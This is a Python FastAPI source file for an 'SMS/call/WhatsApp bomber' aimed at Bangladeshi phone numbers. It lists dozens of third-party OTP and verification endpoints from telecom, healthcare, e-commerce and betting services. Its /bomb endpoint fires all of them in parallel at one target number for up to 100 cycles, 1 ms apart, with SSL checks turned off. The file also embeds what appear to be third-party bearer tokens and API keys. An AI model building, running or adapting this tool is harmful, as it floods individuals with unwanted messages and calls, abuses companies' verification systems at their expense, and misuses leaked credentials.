# ============================================================
# 🔥 BD ULTIMATE BOMBER API - 11 DIGIT VERSION 🔥
# ============================================================
# ✅ SIRF BD WORKING APIS (SHUVO/FELIX REMOVED)
# ✅ 11 DIGIT BD NUMBER SUPPORT (017XXXXXXXX)
# ✅ IMO + CALL + WHATSAPP + SMS
# ✅ SPEED: 0.001s (MAXIMUM)
# ✅ API KEY: shuvobdbom
# ============================================================

from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn
import asyncio
import aiohttp
import time
import os
import random
import re
from typing import Optional
from contextlib import asynccontextmanager

# ==================== CONFIG ====================
API_KEY = "shuvobdbom"
DEFAULT_DELAY = 0.001  # 1 MILLISECOND
MAX_CYCLES = 100

# ==================== PHONE FORMATTER (11 DIGIT BD) ====================
def format_bd_phone(phone):
    """Convert 11 digit BD phone to various formats"""
    # Remove any non-digit characters
    cleaned = re.sub(r'\D', '', phone)
    
    # Handle 11 digit (017XXXXXXXX)
    if len(cleaned) == 11 and cleaned.startswith('01'):
        raw = cleaned[2:]  # Remove 01, get 9 digits
        with_0 = cleaned  # 017XXXXXXXX
        with_88 = f"88{raw}"  # 8817XXXXXXXX
        with_880 = f"880{raw}"  # 88017XXXXXXXX
        with_plus88 = f"+88{raw}"  # +8817XXXXXXXX
        with_plus880 = f"+880{raw}"  # +88017XXXXXXXX
        without_01 = raw  # 17XXXXXXXX (9 digits)
        
    # Handle 10 digit (17XXXXXXXX)
    elif len(cleaned) == 10:
        raw = cleaned
        with_0 = f"0{cleaned}"
        with_88 = f"88{cleaned}"
        with_880 = f"880{cleaned}"
        with_plus88 = f"+88{cleaned}"
        with_plus880 = f"+880{cleaned}"
        without_01 = cleaned
        
    # Handle with +88 or 880 already
    elif len(cleaned) == 12 and cleaned.startswith('88'):
        raw = cleaned[4:] if cleaned.startswith('8801') else cleaned[2:]
        with_0 = f"0{raw}"
        with_88 = cleaned
        with_880 = f"880{raw}"
        with_plus88 = f"+{cleaned}"
        with_plus880 = f"+880{raw}"
        without_01 = raw
    else:
        raw = cleaned[-10:] if len(cleaned) > 10 else cleaned
        with_0 = f"0{raw}"
        with_88 = f"88{raw}"
        with_880 = f"880{raw}"
        with_plus88 = f"+88{raw}"
        with_plus880 = f"+880{raw}"
        without_01 = raw
    
    return {
        'raw': raw,
        'with_0': with_0,
        'with_88': with_88,
        'with_880': with_880,
        'with_plus88': with_plus88,
        'with_plus880': with_plus880,
        'without_01': without_01,
        'original': phone
    }

# ==================== ALL BD APIS (ONLY WORKING) ====================

# ====== BTCL SERVICES (3) ======
BTCL_APIS = [
    {"name": "📞 BTCL MyBTCL", "method": "POST", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNbr":"{p['with_0']}","email":"","OTPType":1,"userName":""}}', "type": "call"},
    {"name": "📞 BTCL PhoneBill", "method": "POST", "url": "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNbr":"{p['with_0']}","email":"","OTPType":1,"userName":""}}', "type": "call"},
    {"name": "📞 BTCL BDIA", "method": "POST", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"actionType=otpSend&mobileNo={p['with_0']}", "type": "call"},
]

# ====== GP SERVICES (6) ======
GP_APIS = [
    {"name": "🎬 MyGP Cinematic", "method": "POST", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}", "headers": {"Content-Type": "application/json"}, "data": lambda p: "{}", "type": "sms", "url_key": "with_plus88"},
    {"name": "🌐 GP Web Login", "method": "POST", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"msisdn={p['with_0']}", "type": "sms"},
    {"name": "💼 GP Flexiplan", "method": "POST", "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payment_mode":"mobile_balance","msisdn":"{p['with_0']}","bundle_id":60817,"is_login":false}}', "type": "sms"},
    {"name": "📡 GP FWA", "method": "POST", "url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p['with_0']}","email":"","language":"en"}}', "type": "sms"},
    {"name": "💬 Mevrik GP", "method": "POST", "url": "https://channels.mevrik.com:4202/api/v1/claim-session", "headers": {"Content-Type": "text/plain"}, "data": lambda p: f'{{"data":{{"user_ref":"{p['with_0']}","name":"Test User"}}}}', "type": "whatsapp"},
    {"name": "📱 GP MyGP App", "method": "POST", "url": "https://api.mygp.com.bd/v1/auth/send-otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"msisdn":"{p['with_0']}"}}', "type": "sms"},
]

# ====== HEALTHCARE (8) ======
HEALTHCARE_APIS = [
    {"name": "🏥 Arogga", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send/", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p['with_0']}", "type": "sms"},
    {"name": "💊 ePharma", "method": "POST", "url": "https://epharma.com.bd/authentification/send-otp", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"number={p['with_plus88']}", "type": "sms"},
    {"name": "🩺 MedEasy", "method": "GET", "url": "https://api.medeasy.health/api/send-otp/{phone}/", "headers": {}, "type": "sms", "url_key": "with_plus88"},
    {"name": "🏩 TheClinicall", "method": "POST", "url": "https://theclinicall.com/bkapi/auth/user/otp/signin", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"countryCode":"BD","dialCode":"880","phone":"{p['raw']}"}}', "type": "sms"},
    {"name": "📦 Care Box", "method": "POST", "url": "https://www.api-care-box.click/api/user/register/", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"Name":"Test User","Phone":"{p['with_plus880']}"}}', "type": "sms"},
    {"name": "🔬 Renix Care", "method": "POST", "url": "https://renixapi.renixcare.com/sms-api/send-otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p['with_0']}"}}', "type": "sms"},
    {"name": "💊 Osudpotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_plus88']}","deviceToken":"web","language":"en","os":"web"}}', "type": "sms"},
    {"name": "🏥 LifeCare BD", "method": "POST", "url": "https://api.lifecare.com.bd/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_0']}"}}', "type": "sms"},
]

# ====== E-COMMERCE (5) ======
ECOMMERCE_APIS = [
    {"name": "🎫 BD Tickets", "method": "POST", "url": "https://api.bdtickets.com:20100/v1/auth", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"createUserCheck":true,"phoneNumber":"{p['with_plus88']}","applicationChannel":"WEB_APP"}}', "type": "sms"},
    {"name": "🛍️ Apex4U", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p['with_0']}"}}', "type": "sms"},
    {"name": "🔄 Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "headers": {"Content-Type": "application/json", "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0="}, "data": lambda p: f'{{"phone":"{p['with_0']}"}}', "type": "sms"},
    {"name": "🏪 Bikroy", "method": "GET", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "headers": {"accept-language": "bn"}, "type": "sms", "url_key": "with_0"},
    {"name": "🛒 Daraz BD", "method": "POST", "url": "https://api.daraz.com.bd/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_0']}"}}', "type": "sms"},
]

# ====== ENTERTAINMENT (4) ======
ENTERTAINMENT_APIS = [
    {"name": "🎬 Bioscope Plus", "method": "POST", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p['with_plus88']}"}}', "type": "sms"},
    {"name": "📚 Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_no":"{p['with_0']}"}}', "type": "sms"},
    {"name": "🎮 Deepto Play", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p['with_plus880']}"}}', "type": "sms"},
    {"name": "🎵 Chorki BD", "method": "POST", "url": "https://api.chorki.com/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p['with_0']}"}}', "type": "sms"},
]

# ====== GAMING/BETTING (4) ======
GAMING_APIS = [
    {"name": "🎲 Jayabaji", "method": "POST", "url": "https://www.jayabaji3.com/api/register/check-username", "headers": {"Content-Type": "application/json", "device": "desktop", "lang": "bn-bd"}, "data": lambda p: f'{{"username":"user{random.randint(10000,99999)}","email":"","mobileno":"{p['raw']}","language":"bn","langCountry":"bn-bd"}}', "type": "sms"},
    {"name": "🎰 PKLuck2 Register", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/register", "headers": {"Content-Type": "application/json", "Device": "web", "Merchant": "pklubdtf4"}, "data": lambda p: f'{{"countryDialingCode":"880","mobileNo":"{p['with_0']}"}}', "type": "sms"},
    {"name": "🎲 PKLuck2 NoLogin", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "headers": {"Content-Type": "application/json", "Device": "web", "Merchant": "pklubdtf4"}, "data": lambda p: f'{{"mobileNum":"{p['with_0']}","countryDialingCode":"880"}}', "type": "sms"},
    {"name": "🎮 BD Games", "method": "POST", "url": "https://api.bdgames.com.bd/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_0']}"}}', "type": "sms"},
]

# ====== MARKETPLACE (5) ======
MARKETPLACE_APIS = [
    {"name": "🌍 Ilyn Global", "method": "POST", "url": "https://api.ilyn.global/auth/signup", "headers": {"appcode": "ilyn-bd"}, "data": lambda p: f'{{"phone":{{"code":"BD","number":"{p['with_plus88']}"}},"provider":"sms"}}', "type": "sms"},
    {"name": "💰 Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"msisdn":"{p['with_0']}"}}', "type": "sms"},
    {"name": "📖 Garibook", "method": "POST", "url": "https://api.garibookadmin.com/api/v3/user/login", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_0']}","recaptcha_token":"garibookcaptcha","channel":"web"}}', "type": "sms"},
    {"name": "🏠 Sheba", "method": "POST", "url": "https://accountkit.sheba.xyz/api/shooot-otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_plus88']}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}}', "type": "sms"},
    {"name": "🤝 Shombhob", "method": "POST", "url": "https://shombhob.com/api/otp-login", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p['with_0']}"}}', "type": "sms"},
]

# ====== FASHION (3) ======
FASHION_APIS = [
    {"name": "👕 Sailor Clothing", "method": "POST", "url": "https://backend.sailor.clothing/api/v2/auth/password/forget_request", "headers": {"Content-Type": "application/json", "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr"}, "data": lambda p: f'{{"email_or_phone":"{p['with_0']}","send_code_by":"phone"}}', "type": "sms"},
    {"name": "👗 Isho", "method": "POST", "url": "https://www.isho.com/register_otp", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"_token=dummy&phone={p['with_0']}&email=test@gmail.com", "type": "sms"},
    {"name": "👔 GentlePark", "method": "POST", "url": "https://api.gentlepark.com.bd/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p['with_0']}"}}', "type": "sms"},
]

# ====== APP SERVICES (2) ======
APP_APIS = [
    {"name": "📱 AppLink", "method": "POST", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"msisdn":"{p['with_88']}"}}', "type": "sms"},
    {"name": "📲 BD App Store", "method": "POST", "url": "https://api.bdappstore.com/v1/auth/otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p['with_0']}"}}', "type": "sms"},
]

# ====== IMO APIS (2) ======
IMO_APIS = [
    {"name": "💬 IMO OTP", "method": "POST", "url": "https://api.imo.im/v1/account/request_otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p['with_plus88']}","country_code":"BD"}}', "type": "call"},
    {"name": "💬 IMO Voice", "method": "POST", "url": "https://api.imo.im/v1/account/request_voice_otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p['with_plus88']}","country_code":"BD"}}', "type": "call"},
]

# ====== CALL APIS (7) ======
CALL_APIS = [
    {"name": "📞 Call Bomber 1", "method": "GET", "url": "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 Call Bomber 2", "method": "GET", "url": "https://call-bomber.vercel.app/bomb?num={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 FreeFire Call", "method": "GET", "url": "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=1", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 BD Call Master", "method": "GET", "url": "https://bomberr.onrender.com/num={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 Bolbet Call", "method": "GET", "url": "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 Bomberr Xtreme", "method": "GET", "url": "https://bomberr2.onrender.com/bomb?num={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
    {"name": "📞 BD Voice OTP", "method": "GET", "url": "https://bomberrr.vercel.app/?key=roots&number={phone}", "headers": {}, "type": "call", "url_key": "with_0"},
]

# ====== WHATSAPP APIS (6) ======
WHATSAPP_APIS = [
    {"name": "💬 KPN WhatsApp", "method": "POST", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+88","number":"{p['raw']}"}}}}', "type": "whatsapp"},
    {"name": "💬 Jockey WhatsApp", "method": "GET", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/{phone}?whatsapp=true", "headers": {}, "type": "whatsapp", "url_key": "with_plus88"},
    {"name": "💬 Rappi WhatsApp", "method": "POST", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+88","phone":"{p['raw']}"}}', "type": "whatsapp"},
    {"name": "💬 Foxy WhatsApp", "method": "POST", "url": "https://www.foxy.in/api/v2/users/send_otp", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"{p['with_plus88']}"}},"via":"whatsapp"}}', "type": "whatsapp"},
    {"name": "💬 Stratzy WhatsApp", "method": "POST", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p['raw']}"}}', "type": "whatsapp"},
    {"name": "💬 Eka Care WhatsApp", "method": "POST", "url": "https://auth.eka.care/auth/init", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"{p['with_plus88']}"}},"type":"mobile"}}', "type": "whatsapp"},
]

# ====== MERGE ALL APIS ======
ALL_APIS = []
ALL_APIS.extend(BTCL_APIS)
ALL_APIS.extend(GP_APIS)
ALL_APIS.extend(HEALTHCARE_APIS)
ALL_APIS.extend(ECOMMERCE_APIS)
ALL_APIS.extend(ENTERTAINMENT_APIS)
ALL_APIS.extend(GAMING_APIS)
ALL_APIS.extend(MARKETPLACE_APIS)
ALL_APIS.extend(FASHION_APIS)
ALL_APIS.extend(APP_APIS)
ALL_APIS.extend(IMO_APIS)
ALL_APIS.extend(CALL_APIS)
ALL_APIS.extend(WHATSAPP_APIS)

# Count by type
call_count = len(IMO_APIS) + len(CALL_APIS) + 3  # BTCL calls
wa_count = len(WHATSAPP_APIS) + 1  # Mevrik GP
sms_count = len(ALL_APIS) - call_count - wa_count

print(f"🔥 BD ULTIMATE API INITIALIZED")
print(f"📡 TOTAL APIS LOADED: {len(ALL_APIS)}")
print(f"   📞 CALL: {call_count}")
print(f"   💬 WHATSAPP: {wa_count}")
print(f"   📨 SMS: {sms_count}")
print(f"🔑 API KEY: {API_KEY}")
print("")

# ==================== FASTAPI APP ====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    print("🔥 BD ULTIMATE BOMBER API STARTED")
    print(f"📡 Total APIs: {len(ALL_APIS)}")
    print(f"⚡ Speed: {DEFAULT_DELAY}s")
    print(f"🔑 API Key: {API_KEY}")
    yield
    print("🛑 API STOPPED")

app = FastAPI(title="BD Ultimate Bomber API", version="6.0", lifespan=lifespan)

# CORS for all origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== HELPER ====================
def get_url(api, phone_data):
    """Get formatted URL from API"""
    url = api["url"]
    url_key = api.get("url_key", "with_0")
    return url.format(phone=phone_data[url_key])

def get_data(api, phone_data):
    """Get formatted data from API"""
    if api.get("data"):
        return api["data"](phone_data)
    return None

# ==================== API ENDPOINTS ====================
@app.get("/")
async def root():
    return {
        "status": "🔥 BD ULTIMATE BOMBER API ACTIVE 🔥",
        "version": "6.0",
        "total_apis": len(ALL_APIS),
        "api_key": API_KEY,
        "speed": f"{DEFAULT_DELAY}s",
        "phone_format": "11 digits (e.g., 01798063356)",
        "apis_included": {
            "BTCL": 3,
            "GP": 6,
            "Healthcare": 8,
            "E-commerce": 5,
            "Entertainment": 4,
            "Gaming": 4,
            "Marketplace": 5,
            "Fashion": 3,
            "App": 2,
            "IMO": 2,
            "Call": len(CALL_APIS),
            "WhatsApp": len(WHATSAPP_APIS)
        },
        "endpoints": {
            "bomb": f"/bomb?phone=01798063356&key={API_KEY}&cycles=10",
            "health": "/health",
            "stats": f"/stats?key={API_KEY}"
        }
    }

@app.get("/health")
async def health():
    return {"status": "ok", "timestamp": time.time(), "api": "BD Ultimate Bomber"}

@app.get("/stats")
async def stats(key: str = Query(...)):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    return {
        "total_apis": len(ALL_APIS),
        "default_delay": DEFAULT_DELAY,
        "max_cycles": MAX_CYCLES,
        "api_key": API_KEY,
        "apis_list": [api["name"] for api in ALL_APIS[:30]]
    }

@app.get("/bomb")
async def bomb(
    phone: str = Query(..., description="11-digit BD phone number (e.g., 01798063356)"),
    key: str = Query(..., description="API key"),
    cycles: int = Query(10, description="Number of cycles", ge=1, le=MAX_CYCLES),
    delay: Optional[float] = Query(None, description="Custom delay in seconds")
):
    # API KEY CHECK
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    # Format phone
    phone_data = format_bd_phone(phone)
    
    # Validate BD phone (11 digits starting with 01)
    if not phone_data['with_0'].startswith('01') or len(phone_data['with_0']) != 11:
        raise HTTPException(status_code=400, detail="Invalid BD phone number! Must be 11 digits starting with 01 (e.g., 01798063356)")
    
    use_delay = delay if delay is not None else DEFAULT_DELAY
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        total_hits = 0
        cycle_results = []
        call_hits = 0
        sms_hits = 0
        wa_hits = 0
        
        for cycle in range(cycles):
            # Fire all APIs in parallel
            tasks = []
            for api in ALL_APIS:
                try:
                    url = get_url(api, phone_data)
                    headers = api.get("headers", {})
                    data = get_data(api, phone_data)
                    method = api["method"]
                    
                    if method == "POST":
                        tasks.append(session.post(url, headers=headers, data=data, timeout=3, ssl=False))
                    else:
                        tasks.append(session.get(url, headers=headers, timeout=3, ssl=False))
                except:
                    continue
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            hits = 0
            cycle_call = 0
            cycle_sms = 0
            cycle_wa = 0
            
            for i, r in enumerate(results):
                if isinstance(r, Exception):
                    continue
                if hasattr(r, 'status') and 200 <= r.status < 500:
                    hits += 1
                    if i < len(ALL_APIS):
                        api_type = ALL_APIS[i].get("type", "sms")
                        if api_type == "call":
                            cycle_call += 1
                        elif api_type == "whatsapp":
                            cycle_wa += 1
                        else:
                            cycle_sms += 1
            
            total_hits += hits
            call_hits += cycle_call
            sms_hits += cycle_sms
            wa_hits += cycle_wa
            
            cycle_results.append({
                "cycle": cycle + 1,
                "hits": hits,
                "total_hits": total_hits,
                "call": cycle_call,
                "sms": cycle_sms,
                "whatsapp": cycle_wa
            })
            
            await asyncio.sleep(use_delay)
    
    elapsed = time.time() - start_time
    
    return JSONResponse({
        "success": True,
        "target": phone_data['with_0'],
        "target_formatted": phone_data['with_plus88'],
        "cycles": cycles,
        "delay": use_delay,
        "total_hits": total_hits,
        "call_hits": call_hits,
        "sms_hits": sms_hits,
        "whatsapp_hits": wa_hits,
        "average_per_cycle": round(total_hits / cycles, 2),
        "speed_hits_per_sec": round(total_hits / elapsed, 2),
        "time_taken_sec": round(elapsed, 2),
        "details": cycle_results
    })

# ==================== RUN ====================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)